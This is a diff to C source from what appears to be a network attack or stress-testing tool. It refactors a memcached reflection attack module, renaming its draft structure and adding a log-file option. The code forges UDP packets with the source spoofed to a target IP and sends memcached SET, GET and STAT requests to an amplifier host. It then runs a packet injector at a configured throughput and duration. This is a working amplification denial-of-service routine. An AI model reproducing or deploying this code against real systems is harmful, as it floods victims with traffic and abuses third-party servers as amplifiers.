@@ -13,53 +13,49 @@
 
 #define GetPort( port ) ( port > 0 ) ? port : MEMCACHED_DEFAULT_PORT
 
-static AttackPlan * createAttackDataGETSET( AttackDraft *draft )
+static AttackPlan * createAttackDataGETSET( LhfDraft *p_draft )
 {
-  AttackPlan *newData;
-  int arg;
+    AttackPlan *newData;
+    int arg;
 
-  memalloc( (void *)&newData, sizeof( AttackPlan ) );
-  arg = MEMCACHED_SET;
-  newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
-  arg = MEMCACHED_GET;
-  newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
-  newData->initialThroughput = draft->throughput;
-  newData->timer = draft->timer;
-
-  return newData;
+    memalloc( (void *)&newData, sizeof( AttackPlan ) );
+    arg = MEMCACHED_SET;
+    newData->setPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
+    arg = MEMCACHED_GET;
+    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
+    newData->draft = p_draft;
+    return newData;
 }
 
-static AttackPlan * createAttackDataSTATS( AttackDraft *draft )
+static AttackPlan * createAttackDataSTATS( LhfDraft *p_draft )
 {
     AttackPlan *newData;
     int arg;
 
     memalloc( (void *)&newData, sizeof( AttackPlan ) );
     arg = MEMCACHED_STAT;
-    newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedBinary, &arg );
-    newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
-    newData->initialThroughput = draft->throughput;
-    newData->timer = draft->timer;
-
+    newData->setPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedBinary, &arg );
+    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
+    newData->draft = p_draft;
     return newData;
 }
 
 void executeAttack( AttackPlan * atkData )
 {
     int sock = CreateSocket(RAW, BLOCK);
+    char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;
     if( SendPacket(sock, atkData->setPacket) < 0 )
     {
         Efatal(ERROR_MEMCACHED, "error memcached\n");
     }
     CloseSocket(sock);
-    StartNetunoInjector( atkData->getPacket, atkData->initialThroughput, atkData->timer);
-  
+    StartNetunoInjector( atkData->getPacket, atkData->draft->throughput, atkData->draft->timer, fileName);
 }
 
 int  ExecuteMemcachedMirror( void *p_draft )
 {
     AttackPlan *plan;
-    AttackDraft *draft = (AttackDraft *) p_draft;
+    LhfDraft *draft = (LhfDraft *)p_draft;
 
     switch( draft->type )
     {
